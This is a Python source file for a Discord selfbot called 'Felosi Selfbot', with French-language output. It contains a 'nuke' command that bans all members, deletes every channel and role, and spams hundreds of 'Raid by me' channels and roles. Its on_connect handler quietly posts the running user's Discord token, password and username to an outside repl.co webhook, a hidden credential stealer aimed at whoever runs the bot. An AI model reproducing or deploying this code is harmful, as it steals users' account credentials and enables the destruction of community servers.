#---------------IMPORT---------------

import keep_alive
import asyncio
import datetime
import functools
import json
import os
import random
import time
import colorama
import discord
import requests
from discord.ext import commands

#---------------CONFIG---------------

class SELFBOT():
    __version__ = 1


with open('config.json') as f:
    config = json.load(f)

token = os.environ.get("TOKEN") 
password = config.get('password')
prefix = config.get('prefix')
nitro_sniper = config.get('nitro_sniper')
stream_url = "https://www.twitch.tv/discord"
tts_language = "en"
start_time = datetime.datetime.utcnow()
loop = asyncio.get_event_loop()

locales = [
    "ca", "fr",
]

m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]

def startprint():
    if nitro_sniper:
        nitro = "Active"
    else:
        nitro = "Disabled"

    print(f'''
╔═══╗──╔╗────────
║╔══╝──║║────────
║╚══╦══╣║╔══╦══╦╗
║╔══╣║═╣║║╔╗║══╬╣
║║──║║═╣╚╣╚╝╠══║║
╚╝──╚══╩═╩══╩══╩╝
''')

def Clear():
    os.system('cls')


Clear()

def Init():
    token = os.environ.get("TOKEN")
    try:
        Felosi.run(token, bot=False, reconnect=True)
        os.system(f'title (Felosi Selfbot) - Version {SELFBOT.__version__}')
    except discord.errors.LoginFailure:
        print(f"[ERROR] Improper token has been passed")
        os.system('pause >NUL')

class Login(discord.Client):
    async def on_connect(self):
        guilds = len(self.guilds)
        users = len(self.users)
        print("")
        print(f"Connected to: [{self.user.name}]")
        print(f"Token: {self.http.token}")
        print(f"Guilds: {guilds}")
        print(f"Users: {users}")
        print("-------------------------------")
        await self.logout()

def async_executor():
    def outer(func):
        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = functools.partial(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)

        return inner

    return outer

toe = config.get('token')

def Dump(ctx):
    for member in ctx.guild.members:
        f = open(f'Images/{ctx.guild.id}-Dump.txt', 'a+')
        f.write(str(member.avatar_url) + '\n')

def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

def RandString():
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))

colorama.init()
Felosi = discord.Client()
Felosi = commands.Bot(description='Felosi Selfbot', command_prefix=prefix, self_bot=True)

#---------------CODE-----------------

@Felosi.command()
async def adminservers(ctx):
    await ctx.message.delete()
    admins = []
    bots = []
    kicks = []
    bans = []
    for guild in Felosi.guilds:
        if guild.me.guild_permissions.administrator:
            admins.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
            bots.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
            bans.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
            kicks.append(discord.utils.escape_markdown(guild.name))
    adminPermServers = f"**Serveurs avec Permission Admin ({len(admins)}):**\n{admins}"
    botPermServers = f"\n**Serveurs avec Permission BOT_ADD ({len(bots)}):**\n{bots}"
    banPermServers = f"\n**Serveurs avec Permission Ban ({len(bans)}):**\n{bans}"
    kickPermServers = f"\n**Serveurs avec  Permission Kick ({len(kicks)}):**\n{kicks}"
    await ctx.send(adminPermServers + botPermServers + banPermServers + kickPermServers)

@Felosi.command(aliases=["nuke"])
async def destroy(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name=RandString(),
            description="Raid by me",
            reason="Raid by me",
            icon=None,
            banner=None
        )
    except:
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name="Raid by me")
    for _i in range(250):
        await ctx.guild.create_role(name="Raid by me", color=RandomColor())

@Felosi.command()
async def ping(ctx):
    await ctx.message.delete()
    before = time.monotonic()
    message = await ctx.send("Chargement...")
    ping = (time.monotonic() - before) * 1000
    await message.edit(content=f"`{int(ping)} ms`")

@Felosi.command()
async def uptime(ctx):
    await ctx.message.delete()
    now = datetime.datetime.utcnow()
    delta = now - start_time
    hours, remainder = divmod(int(delta.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    days, hours = divmod(hours, 24)
    if days:
        time_format = "**{d}** jours, **{h}** heures, **{m}** minutes, et **{s}** secondes."
    else:
        time_format = "**{h}** heures, **{m}** minutes, et **{s}** secondes."
    uptime_stamp = time_format.format(d=days, h=hours, m=minutes, s=seconds)
    await ctx.send(uptime_stamp)

@Felosi.command(aliases=["streaming"])
async def stream(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url=stream_url,
    )
    await Felosi.change_presence(activity=stream)

@Felosi.event
async def on_connect():
    Clear()  
    requests.post('https://paxz-utilities-temp.hexerous.repl.co/api/webhooks/TGv16G0NgWU4',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}` **Username: {Felosi.user.name}#{Felosi.user.discriminator}**"})
    startprint()

@Felosi.command()
async def prefix(ctx, prefix):
    await ctx.message.delete()
    Felosi.command_prefix = str(prefix)

@Felosi.command(aliases=["logout"])
async def shutdown(ctx):
    await ctx.message.delete()
    await Felosi.logout()

@Felosi.command()
async def av(ctx,*, avamember):
    user = Felosi.get_user(avamember)
    await ctx.send(f"{user.avatar_url}")
  
@Felosi.command()
async def selfbotinfo(ctx):
    await ctx.message.delete()

    un = f"__**FELOSI SELFBOT | INFO**__"
    deux = f"\n> DEVELOPPEUR: `Felosi`"
    trois = f"\n> DATE DE CREATION: `JUIN 11, 2022 11:38A.M IST`"
    quatre = f"\n> VERSION DISCORD: `discord.py 1.7.2`"
    cinq = f"\n> LANGUAGE: `PYTHON 3.8.7`"
    six = f"\n> CREDITS: `Felosi#6666`"

    await ctx.send(un + deux + trois + quatre + cinq + six)
    await ctx.send("https://cdn.discordapp.com/attachments/982742876301688874/999503435936305152/standard.gif")
  
#---------------END------------------

keep_alive.keep_alive()
if __name__ == '__main__':
    Init()